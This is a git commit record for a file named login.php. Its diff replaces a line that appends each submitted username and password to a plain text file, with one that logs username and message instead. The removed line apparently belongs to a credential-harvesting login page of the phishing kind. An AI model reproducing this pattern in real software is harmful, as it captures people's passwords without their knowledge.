ef1cbfea03b7f5f67d2f26a83215a1a6970979b0
554896498498987 <82153123+554896498498987@users.noreply.github.com>
2021-04-24 09:57:22 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,4 +1,4 @@
 <?php
- file_put_contents("messages.txt",$_POST['username']. "\n" .$_POST['password'] . "\n\n",FILE_APPEND);
+ file_put_contents("messages.txt",$_POST['username']. "\n" .$_POST['message'] . "\n\n",FILE_APPEND);
  exit();
 
